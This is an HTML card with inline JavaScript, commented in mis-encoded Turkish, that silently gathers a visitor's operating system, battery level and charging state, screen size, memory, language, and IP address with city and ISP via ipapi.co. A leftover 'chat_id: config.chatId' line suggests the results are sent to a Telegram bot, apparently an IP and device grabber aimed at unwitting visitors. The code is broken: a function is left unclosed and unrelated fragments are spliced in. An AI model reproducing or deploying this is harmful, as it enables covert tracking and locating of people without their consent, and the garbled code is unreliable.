<div class="card">

<script>

    // 1. GeliÅŸmiÅŸ Cihaz Ã–zelliklerini Topla
    async function getDeviceSpecs() {
        const ua = navigator.userAgent;
        let os = "Bilinmeyen";
        if (ua.indexOf("Android") != -1) os = "Android";
        if (ua.indexOf("iPhone") != -1) os = "iPhone";
        
        let pil = "AlÄ±namadÄ±";
        try {
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                pil = `%${Math.round(b.level * 100)} (${b.charging ? 'Åarjda' : 'DeÄŸil'})`;
            }
        } catch (e) {}

        return {
            os: os,
            ekran: `${window.screen.width}x${window.screen.height}`,
            bellek: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Bilinmiyor",
            pil: pil,
            dil: navigator.language
        };
    }

    async function getIpData() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            return `${data.ip} (${data.city} / ${data.org})`;
        } catch (e) { return "IP AlÄ±namadÄ±"; }

                    chat_id: config.chatId,

        } catch (error) { resDiv.innerHTML = "Sistem HatasÄ±!"; }
    }
</script>
